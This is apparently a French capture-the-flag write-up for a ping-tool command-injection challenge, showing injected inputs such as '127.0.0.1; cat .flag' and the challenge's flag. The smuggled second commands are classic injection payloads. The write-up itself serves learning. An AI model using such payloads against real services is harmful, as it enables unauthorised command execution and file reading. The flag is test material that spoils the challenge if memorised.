# Sire, ça Ping ! (Command Injection)

**Flag :** `HSR{s1r3_l3_p1g30n_a_tr0uv3_la_f0rt3r3ss3!}`

---

## Table des matières

- [Contexte](#contexte)
- [Étape 1 - Test normal](#étape-1---test-normal)
- [Étape 2 - Injection de commande](#étape-2---injection-de-commande)
- [Résumé de la chaîne de résolution](#résumé-de-la-chaîne-de-résolution)

---

## Contexte

On accède à un outil de diagnostic du Royaume de Logres. Un formulaire permet d'envoyer un " pigeon " (ping) vers une forteresse distante. Le champ de saisie prend une adresse et le serveur exécute une commande ping.

---

## Étape 1 - Test normal

On entre `127.0.0.1` et on obtient la sortie standard de ping :

```
PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: seq=0 ttl=64 time=0.042 ms
```

Le serveur exécute bien une commande `ping` avec notre saisie.

---

## Étape 2 - Injection de commande

L'entrée utilisateur est concaténée directement dans la commande shell sans aucun filtrage. On injecte un `;` pour chaîner une seconde commande.

On commence par lister les fichiers :

```
127.0.0.1; ls
```

On voit `flag.txt` mais pas de fichier caché. On tente de le lire :

```
127.0.0.1; cat flag.txt
```

C'est un leurre (GIF Kaamelott).

### Commandes autorisées (whitelist)

> **Note post-CTF :** Le code présenté ici a été modifié après le CTF. Lors de l'épreuve, le serveur utilisait une blacklist (filtrage par regex) et les participants pouvaient exécuter des commandes comme `rm`, `mv`, `cp`, etc. Certains en ont profité pour supprimer ou modifier le flag. Le code a donc été remplacé par une whitelist pour éviter ce problème en cas de réutilisation du challenge.

Seules les commandes `ping`, `cd`, `ls` (sans `-a`), `ls -l` et `cat` sont autorisées. Toute autre commande est bloquée par le serveur.

Si on essaie `127.0.0.1; find . -type f` ou `127.0.0.1; rm flag.txt`, le serveur renvoie un message de refus.

### Trouver le vrai flag

En suivant les hints (le flag est dans un fichier caché commençant par `.`), on devine `.flag` :

```
127.0.0.1; cat .flag
```

La sortie affiche le résultat du ping suivi du flag :

```
FLAG=HSR{s1r3_l3_p1g30n_a_tr0uv3_la_f0rt3r3ss3!}
```

Autres payloads valides : `127.0.0.1 && cat .flag`, `127.0.0.1 | cat .flag`

---

## Résumé de la chaîne de résolution

```
Outil de diagnostic (ping)
  |
  |-- Tester un ping normal (127.0.0.1) -> fonctionne
          |
          |-- Injection de commande : 127.0.0.1; ls -> on voit flag.txt mais pas .flag
          |
          |-- 127.0.0.1; cat flag.txt -> leurre (faux flag)
          |
          |-- ls -la, find, echo .* -> bloqués par le serveur
                    |
                    |-- Deviner le fichier caché grâce aux hints : 127.0.0.1; cat .flag -> flag
```
